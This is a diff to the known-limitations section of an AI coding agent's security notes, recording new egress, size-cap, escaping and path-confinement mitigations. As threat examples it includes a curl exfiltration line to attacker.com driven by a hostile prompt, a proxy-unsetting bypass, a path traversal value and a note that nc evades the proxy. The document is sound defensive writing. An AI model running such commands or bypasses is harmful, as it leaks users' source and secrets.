@@ -82,27 +82,21 @@ Redacted patterns:
 
 ## Known limitations
 
-### 1. No outbound network restriction
+### 1. No outbound network restriction (mitigated)
 
 The `bash` tool can make outbound HTTP requests (`curl`, `wget`, `nc`). There is no egress filtering at the socket or process level. A determined prompt could exfiltrate project files via `curl -d @secret.txt https://attacker.com`.
 
-**Mitigation in place:** File-level deny matrix prevents reading `.env`, `.ssh/`, `.aws/`, key files. Shell arg scanning rejects obvious attempts to reference these paths. But the model could read a non-blocked file (e.g., `src/config.js`) and `curl` its contents.
+**Mitigation in place:** File-level deny matrix prevents reading `.env`, `.ssh/`, `.aws/`, key files. Shell arg scanning rejects obvious attempts to reference these paths. The `--no-network` flag sets `http_proxy`/`https_proxy` to `127.0.0.1:1` in the bash environment, blocking most HTTP/HTTPS egress.
 
-**Recommended for future:** Add `--no-network` flag that sets `http_proxy=none` or blocks outbound at the `child_process` level.
+**Remaining risk:** The proxy env vars can be unset by the command itself (`unset http_proxy && curl ...`). Non-HTTP protocols (DNS, raw TCP via `nc`, `ncat`) are not affected by proxy settings at all. For strong isolation, use macOS `pf` firewall rules (`/etc/pf.conf`) or run the runner inside a network-restricted VM/container.
 
-### 2. File size unbounded read
+### 2. File size hard cap
 
-`read_file` has configurable `max_bytes`/`max_lines` defaults (50KB/1000 lines), but the model can override them. A 10GB file would exhaust Node's memory.
+`read_file` has configurable `max_bytes`/`max_lines` defaults (50KB/1000 lines), but the model can override them. A hard cap of 1MB (`MAX_BYTES_HARD_CAP`) is now enforced server-side. Requests exceeding this cap are truncated.
 
-**Mitigation in place:** None. The tool trusts the model to respect the defaults.
+### 3. Shell output size hard cap
 
-**Recommended for future:** Enforce a hard cap (e.g., 10MB) regardless of the model's requested limits.
-
-### 3. Shell output size unbounded
-
-`bash` tool output is truncated at 10,000 characters in display, but the underlying `execSync` can buffer up to 10MB. A command like `yes | head -c 10000000` would consume memory.
-
-**Mitigation in place:** `maxBuffer: 10MB` on `execSync`. OOM is unlikely but possible.
+`bash` tool output is now truncated at 100,000 characters (100KB). The `execSync`/`spawnSync` buffer is capped at 1MB. Stderr is captured and prefixed with `[stderr]` on success.
 
 ### 4. No rate limiting on tool calls
 
@@ -111,3 +105,15 @@ The model can make unlimited tool calls within `max_steps`. There's no per-secon
 ### 5. Transcript contains source code
 
 Transcript JSONL files include tool results (file contents, shell output). These contain project source code. Treat transcripts as sensitive.
+
+### 6. Command injection in search_text (mitigated)
+
+The `search_text` tool constructs shell commands from the user's pattern. Shell metacharacters are now properly escaped using single-quote wrapping with internal quote escaping.
+
+### 7. undo/undo_edit/apply_patch path validation (mitigated)
+
+`undo`, `undo_edit`, and `apply_patch` now validate paths through `safety.confinePath()` before operating. This prevents path traversal attacks (e.g., `--path ../../../etc/passwd`).
+
+### 8. write_file content validation (mitigated)
+
+`write_file` now validates that `content` is a string and the path passes `confinePath()`. Missing content returns an error instead of crashing.
